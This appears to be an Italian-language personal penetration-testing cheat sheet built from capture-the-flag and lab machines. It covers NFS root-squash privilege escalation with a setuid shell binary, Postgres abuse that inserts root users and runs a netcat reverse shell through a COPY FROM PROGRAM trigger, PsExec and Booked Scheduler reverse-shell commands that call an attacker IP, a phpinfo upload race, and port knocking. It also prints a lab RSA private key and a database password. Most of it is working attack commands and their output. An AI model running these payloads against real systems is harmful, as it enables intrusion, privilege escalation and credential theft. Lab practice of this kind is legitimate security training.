root_squash: Fa in modo che tutti gli accessi dei client al filesystem esportato, effettuati da utenti root sulle macchine client, avvengano come user ID per l'utente nobody. Questo in effetti "declassa" il potere dell'utente root remoto a quello del più semplice utente locale, impedendo una alterazione dei file non autorizzata sul server remoto. In alternativa, l'opzione no_root_squash disabilita questa funzione.

```
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,root_squash)
```

Vedendo con sudo -l:
```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

Abbiamo la possibilità di modificare quel file di configurazione per permettere al nostro utente root di scrivere sulla directory nfs.
```
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,no_root_squash)
```

Non avendo la possibilità di riavviare il servizio nfs, riavviamo la macchina.
Così riusciamo ad accedere con il nostro root:
```
┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
                                                                                                                                                                        
┌──(root💀kali)-[/home/kali/Documents/Vulnhub/Hacklab_Vulnix]
└─# ls -la home/
total 32
drwxr-x--- 4 vulnix vulnix 4096 Jun  6 07:37 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:43 ..
-rw------- 1 vulnix vulnix  338 Jun  6 07:40 .bash_history
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix 4096 Jun  6 07:21 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .ssh
```

Ora posso creare un file che apre una shell con i permessi di root e caricarla sulla directory nfs per poi avviarla con l'utente con low-privileges:
(Volendo potevo copiargli direttamente /bin/bash (dargli sempre ```chmod 4777 /bin/bash``` e poi sulla macchina vittima dovevo eseguire ```/bin/bash -p``` per far rimanere i privilegi settati) ma essendo architetture diverse, mi dava problemi quando provavo ad eseguirlo poi sulla macchina vittima)
Quindi ho creato un file bash.c:

```
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
```
E l'ho caricato e compilato (perchè sulla macchina vittima non c'era gcc e gli ho dato i permessi di suid)
```
┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# gcc -o setuid bash.c -m32
bash.c: In function ‘main’:
bash.c:3:6: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    3 |      setgid(0);
      |      ^~~~~~
bash.c:4:6: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    4 |      setuid(0);
      |      ^~~~~~
bash.c:5:6: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |      system("/bin/bash");
      |      ^~~~~~
                                                                                                                  
┌──(root💀kali)-[/home/…/Documents/Vulnhub/Hacklab_Vulnix/home]
└─# chmod 4777 setuid 
```

Poi dalla macchina vittima:
```
vulnix@vulnix:~$ ls -la
total 52
drwxr-x--- 4 vulnix vulnix  4096 Jun  6 17:13 .
drwxr-xr-x 4 root   root    4096 Sep  2  2012 ..
-rw-r--r-- 1 root   root      73 Jun  6 17:13 bash.c
-rw------- 1 vulnix vulnix   359 Jun  6 17:06 .bash_history
-rw-r--r-- 1 vulnix vulnix   220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix  3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix  4096 Jun  6 12:21 .cache
-rw-r--r-- 1 vulnix vulnix   675 Apr  3  2012 .profile
-rwsrwxrwx 1 root   root   15564 Jun  6 17:13 setuid
drwxr-xr-x 2 vulnix vulnix  4096 Jun  6 12:20 .ssh
vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ exit
exit
vulnix@vulnix:~$ ./setuid 
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root),2008(vulnix)
```


Ricorda:
https://ranakhalil101.medium.com/hack-the-box-jail-writeup-w-o-metasploit-c0601ed7b947
```
bash-4.2$ cat /etc/exports
cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)

The configuration for both directories is the same.

    Read and write privileges
    The setting root_squash is configured which maps all requests from uid/gid 0 to the anonymous uid/gid. This is why we weren’t able to view the files although the attack machine was running with the uid/gid 0. When we made the request to view the file, our id got mapped to the anonymous id and our request got rejected.
    More interestingly, the no_all_squash setting is configured which does NOT map all the requests from other uids/gids to the anonymous uid/gid. This again is the default setting for NFS shares.
```

Per testare se root_squash è abilitato si va nelle cartelle montate come root (dalla macchina attaccante) e si vede se si hanno i permessi per tutte le cartelle:
```
root@kali:~/Desktop/htb/jail/nfs/opt# cd logreader
bash: cd: logreader: Permission deniedroot@kali:~/Desktop/htb/jail/nfs/opt# id
uid=0(root) gid=0(root) groups=0(root)
```

### SNMP

Enumeration:
```
(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmpwalk -v2c -c public 192.168.199.42
```

```
(base) ┌──(kali㉿kali)-[~/Programs/Finger-User-Enumeration]
└─$ snmp-check 192.168.199.42 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.199.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.199.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:47:18.09
  Uptime system                 : 00:46:46.62
  System date                   : 2021-6-7 10:04:16.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 152628
  TCP segments sent             : 149146
  TCP segments retrans          : 746
  Input datagrams               : 154288
  Delivered datagrams           : 154288
  Output datagrams              : 150582

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:bf:d0:b7
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 17672196
  Out octets                    : 41539953

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:d0:b7
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             0                   
  2                     192.168.199.42        255.255.255.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.199.254       0.0.0.0               1                   
  192.168.199.0         0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               25                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               139                   0.0.0.0               0                     listen              
  0.0.0.0               199                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               31337                 0.0.0.0               0                     listen              
  192.168.199.42        25                    192.168.49.199        34668                 established         

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               137                 
  0.0.0.0               138                 
  0.0.0.0               161                 
  192.168.199.42        137                 
  192.168.199.42        138                 

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                  
  4                     runnable              khelper               khelper                                   
  5                     runnable              kacpid                kacpid                                    
  99                    runnable              kblockd/0             kblockd/0                                 
  109                   runnable              pdflush               pdflush                                   
  110                   runnable              pdflush               pdflush                                   
  111                   runnable              kswapd0               kswapd0                                   
  112                   runnable              aio/0                 aio/0                                     
  255                   runnable              kseriod               kseriod                                   
  276                   runnable              scsi_eh_0             scsi_eh_0                                 
  284                   runnable              khubd                 khubd                                     
  348                   runnable              shpchpd_event         shpchpd_event                             
  380                   runnable              kjournald             kjournald                                 
  935                   runnable              vmmemctl              vmmemctl                                  
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
  3773                  running               syslogd               /sbin/syslogd                             
  3776                  runnable              klogd                 /sbin/klogd                               
  3780                  runnable              clamd                 /usr/local/sbin/clamd                      
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3797                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3801                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3802                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3808                  runnable              sshd                  /usr/sbin/sshd                            
  3886                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
  3900                  runnable              atd                   /usr/sbin/atd                             
  3903                  runnable              cron                  /usr/sbin/cron                            
  3910                  runnable              apache                /usr/sbin/apache                          
  3911                  runnable              apache                /usr/sbin/apache                          
  3912                  runnable              apache                /usr/sbin/apache                          
  3913                  runnable              apache                /usr/sbin/apache                          
  3914                  runnable              apache                /usr/sbin/apache                          
  3915                  runnable              apache                /usr/sbin/apache                          
  3931                  runnable              getty                 /sbin/getty           38400 tty1          
  3937                  runnable              getty                 /sbin/getty           38400 tty2          
  3938                  runnable              getty                 /sbin/getty           38400 tty3          
  3939                  runnable              getty                 /sbin/getty           38400 tty4          
  3940                  runnable              getty                 /sbin/getty           38400 tty5          
  3941                  runnable              getty                 /sbin/getty           38400 tty6          
  4045                  runnable              apache                /usr/sbin/apache                          
  4053                  runnable              apache                /usr/sbin/apache                          
  4098                  runnable              apache                /usr/sbin/apache                          
  4120                  runnable              apache                /usr/sbin/apache                          
  4123                  runnable              apache                /usr/sbin/apache                          
  4907                  runnable              inetd                 /usr/sbin/inetd                           

[*] Storage information:

  Description                   : ["Real Memory"]
  Device id                     : [#<SNMP::Integer:0x000055adb62752e0 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61d75b8 @value=1024>]
  Memory size                   : 250.82 MB
  Memory used                   : 144.49 MB

  Description                   : ["Swap Space"]
  Device id                     : [#<SNMP::Integer:0x000055adb61d1ed8 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61cbfb0 @value=1024>]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x000055adb6272b58 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb6270e70 @value=4096>]
  Memory size                   : 3.74 GB
  Memory used                   : 779.46 MB

  Description                   : ["/sys"]
  Device id                     : [#<SNMP::Integer:0x000055adb61bf968 @value=5>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61bdc08 @value=4096>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes


[*] File system information:

  Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1

[*] Device information:

  Id                    Type                  Status                Descr               
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there's a floating point co-processor
```


RCE:
https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/


### accesschk (Windows)
Lo trovi in **~/Download** da caricare sulla macchina

C:\Backup>accesschk.exe /accepteula -q -a TFTP.EXE_bck
accesschk.exe /accepteula -q -a TFTP.EXE_bck
C:\Backup\TFTP.EXE_bck
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW BUILTIN\Administrators
  RW NT AUTHORITY\SYSTEM
  RW NT AUTHORITY\Authenticated Users


### cacls (Windows)
Già su Windows

C:\Backup>cacls TFTP.EXE_bck
cacls TFTP.EXE_bck
C:\Backup\TFTP.EXE_bck BUILTIN\Users:(ID)F 
                       BUILTIN\Administrators:(ID)F 
                       NT AUTHORITY\SYSTEM:(ID)F 
                       NT AUTHORITY\Authenticated Users:(ID)C 


### schtasks (Windows Task Scheduler)

https://docs.microsoft.com/it-it/windows-server/administration/windows-commands/schtasks

Creare un task schedulato che esegue ogni minuto: ("tftp" è il nome che si sceglie per il task e "\Backup\TFTP.EXE" è il path dell'eseguibile e si deve mettere in quel modo)
```
schtasks /create /sc minute /mo 1 /tn "tftp" /tr \Backup\TFTP.EXE
```

Cercare un task schedulato per nome:
```
C:\Backup>schtasks /query /tn tftp2
schtasks /query /tn tftp2

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
tftp2                                    6/8/2021 11:09:00 AM   Ready     
```

Eliminare un task schedulato per nome:
```
schtasks /end /tn tftp2
```

### XSS e Login con uso di Cookie 
https://0xdf.gitlab.io/2019/04/13/htb-redcross.html


### Postgres

**Add user**
https://0xdf.gitlab.io/2019/04/13/htb-redcross.html

```
unix=> insert into passwd_table (username, passwd, gid, homedir) values ('penel0xdf', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 1000, '/home/penelope');
INSERT 0 1
```
E poi controlla in /etc/passwd se c'è l'utente e poi si logga in ssh.

**sudoers Group**
https://0xdf.gitlab.io/2019/04/13/htb-redcross.html

Prima si controlla l'id del gruppo:
```
dff@redcross:~$ grep sudo /etc/group
sudo:x:27:
```

```
unix=> insert into passwd_table (username, passwd, gid, homedir) values ('sud0xdfer', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/home/penelope');
INSERT 0 1
```

Collegandosi poi in ssh:
```
sud0xdfer@redcross:~$ id
uid=2023(sud0xdfer) gid=27(sudo) groups=27(sudo)
```
E poi si può eseguire ```sudo su```.

**unixnssroot**
https://0xdf.gitlab.io/2019/04/13/htb-redcross.html

Crea prima un utente con gruppo 0 però non aveva poi i permessi giusti:
```
ro0xdft@redcross:~$ id
uid=2024(ro0xdft) gid=0(root) groups=0(root)
```
Infatti si vede che l'uid è 2024 e non 0.
Quindi cerca i file di config di psql.
Trova la password in /etc/nss-pgsql-root.conf
```
ro0xdft@redcross:/etc$ cat nss-pgsql-root.conf 
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
```

E aggiunge un utente  sul db con l'utente trovato che dovrebbe essere di root:
```
ro0xdft@redcross:/etc$ psql -h 127.0.0.1 -U unixnssroot -p 5432 -d unix
Password for user unixnssroot: 
psql (9.6.7)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

unix=>
unix=> insert into passwd_table (username, passwd, uid, gid, homedir) values ('r0xdfot', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 0, 0, '/root');
INSERT 0 1
```

E poi:
```
ro0xdft@redcross:/etc$ su r0xdfot
Password: 
r0xdfot@redcross:/etc# id
uid=0(r0xdfot) gid=0(root) groups=0(root)
```
Ed ha anche i permessi di root.


**UDF**
https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md

Command Execution without UDF
https://dba.stackexchange.com/questions/128229/execute-system-commands-in-postgresql

(Prima metti in listening)

```
CREATE TABLE trigger_test (
    tt_id serial PRIMARY KEY,
    command_output text
);

CREATE OR REPLACE FUNCTION trigger_test_execute_command()
RETURNS TRIGGER
LANGUAGE plpgsql
AS $BODY$
BEGIN
    COPY trigger_test (command_output) FROM PROGRAM '/bin/nc 192.168.49.102 80 -e /bin/bash';
    RETURN NULL;
END;
$BODY$;

DROP TABLE trigger_test_source;

CREATE TABLE trigger_test_source (
    s_id integer PRIMARY KEY
);

CREATE TRIGGER tr_trigger_test_execute_command
    AFTER INSERT
    ON trigger_test_source
    FOR EACH STATEMENT
    EXECUTE PROCEDURE trigger_test_execute_command();

INSERT INTO trigger_test_source VALUES (2);
```

Altri comandi:
Vedi anche Nibbles di Providing Grounds.
https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md

List Databases:
```
\l
```

List Database Users:
```
\du
```

Read directory:
```
select pg_ls_dir('/etc');
```

Read file:
```
select pg_read_file('postgresql.conf', 0, 200);
```


### Git ssh
Vedi Hunit di Providing Grounds.

```
git clone /git-server
```

Log:
```
git log
```

Set Git identity:
```
[dademola@hunit git-server]$ git config --global user.name "dademola"
[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
```

```
[dademola@hunit git-server]$ git add backups.sh 
[dademola@hunit git-server]$ git commit -m "Wait for sheeeeell ;)"
```

```
[dademola@hunit git-server]$ export GIT_SSH_COMMAND='ssh -p 43022 -i /home/git/.ssh/id_rsa'
[dademola@hunit git-server]$ git push git@192.168.85.125:/git-server
```

#### .git folder
Per esempio: https://0xdf.gitlab.io/2018/09/15/htb-canape.html

Se si trova una directory listing con .git, si può scaricare con wget:
```
wget --mirror -I .git 10.10.10.70/.git
```
e poi fare un checkout per scaricare i file "veri":
```
git checkout -- .
```

### PsExec
Eseguire un comando con un utente (magari con privilegi più alti) dalla macchina di un altro utente:
```
C:\Users\Bethany\Desktop>PsExec.exe -accepteula -u alice -p aliceishere "%CD%\nc.exe" 192.168.119.168 7676 -e cmd.exe
```

### PHP Info File
Determinare il path della directory della web root:

```
kali@kali:~$ curl http://192.168.120.132:45332/phpinfo.php | grep 'DOCUMENT_ROOT' | html2text
...
DOCUMENT_ROOT
C:/xampp/htdocs
...
```

#### phpinfo.php
Se nel phpinfo si ha:
```
file_uploads = on
```
Si può sfruttare per caricare un file malevolo.

Quindi si cambia la richiesta da GET a POST, si aggiunge il Content-Type header e si inserisce il file:
```
POST /info.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ehjpe8sp040ma068aen884obr7
Upgrade-Insecure-Requests: 1
Content-Length: 194
Content-Type: multipart/form-data; boundary=---------------------------7db268605ae

-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt" Content-Type: text/plainSecurity
Test
-----------------------------7db268605ae
```

E poi nella sezione PHP variables si vedrà il file inserito:
![phpInfo_uploaded](/assets/img/posts/phpinfo_upload.webp)

E include anche il path in cui viene memorizzato il file.
Però questo file rimane per pochi secondi. Per questo si usa lo script:
https://www.insomniasec.com/downloads/publications/phpinfolfi.py

in cui aggiunge del padding negli Header per aumentare il tempo di processamento e quindi aumentare le possibilità di utilizzare la misconfiguration.
Nello script si devono fare delle modifiche, vedi esempio da cui è stato preso: https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp

E poi si esegue: 
```
python phpinfolfi.py 10.10.10.43 80 100
```
Mettendo prima in listening:
```
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:43916.
bash: cannot set terminal process group (1387): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Steganografia (STEGOSANDRO)
Se si trovano immagini:
```
www-data@nineveh:/var/www/ssl/secure_notes$ ls
index.html  nineveh.png
```

Si può usare **strings**:
```
www-data@nineveh:/var/www/ssl/secure_notes$ strings -n 20 nineveh.png 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

Per investigare di più, si può usare il comando **binwalk**:
```
root@kali# binwalk nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```
Siccome dà che c'è uno zip:
```
root@kali# binwalk -e nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

root@kali# find _nineveh.png.extracted/
_nineveh.png.extracted/
_nineveh.png.extracted/54
_nineveh.png.extracted/2BF8D0.tar
_nineveh.png.extracted/54.zlib
_nineveh.png.extracted/secret
_nineveh.png.extracted/secret/nineveh.priv
_nineveh.png.extracted/secret/nineveh.pub
```

E qui in questo esempio troviamo una chiave pubblica e privata.
Esempio preso da https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp


### Port Knocking
Il port knocking è un sistema per aprire delle porte su un firewall dall'esterno inviando tentativi di connessione ad una sequenza prestabilita di porte chiuse; una volta che ciò sia stato fatto le regole del firewall vengono aggiornate dinamicamente per consentire all'host che ha inviato la giusta sequenza di connettersi alla porta voluta. [wiki]

Se c'è il process **knockd**:
```
www-data@nineveh:/$ ps auxww
...[snip]...
root      1334  1.1  0.2   8756  2228 ?        Ss   Apr10  15:29 /usr/sbin/knockd -d -i ens33
...[snip]...
```

knockd is a daemon for port knocking, which will set certain firewall rules when certain ports are hit in order. I can find the config file at /etc/knockd.conf:
```
www-data@nineveh:/$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```
**This says I can open SSH by hitting 571, 290, and then 911 with syns, all within 5 seconds, and on doing so, it will add a rule to allow my IP to get to port 22.**

Quindi dobbiamo dargli la sequenza di porte chiuse e poi possiamo accedere in ssh (perchè magari prima abbiamo trovato una chiave privata o abbiamo la password):
```
root@kali# for i in 571 290 911; do
> nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
> done; ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.
                                                                                                                                                                                                        
                                                                                                                                                                                                        
You have mail.                                                                                                                                                                                          
Last login: Wed Apr 22 05:34:21 2020 from 10.10.14.24                                                                                                                                                    
amrois@nineveh:~$
```

Esempio da https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp


### Privilege Escalation with Path Variable Manipulation
https://clarencesubia.medium.com/tryhackme-kenobi-walkthrough-6cd316fd9c3c

Praticamente trova un binario con SUID e vede con strings che viene eseguito curl senza il path completo e quindi crea un binario curl e cambia la variabile d'ambiente $PATH.


### Web File Server (WFS)
https://zeyu2001.gitbook.io/pentesting/proving-grounds/get-to-work/medjed

ruby shell https://github.com/secjohn/ruby-shells/blob/master/shell.rb --> aggiunta in users_controller.rb perchè sappiamo che dalla web app si possono fare operazioni sugli utenti, quindi cambiando il metodo, per esempio, che chiama la lista degli utenti, si può eseguire una reverse shell.

## Software Vulnerable

### Booked Scheduler 2.7.5
Vedi Zino di Providing Grounds.

```
https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF

http://192.168.102.64:8003/booked/Web/custom-favicon.php?cmd=/usr/bin/nc%20192.168.49.102%203306%20-e%20/bin/bash
```


### PaperStream IP
Vedi Jacko di Providing Grounds.
CVE-2018-16156


### Find gtfo
Vedi Nibbles di Providing Grounds.
```
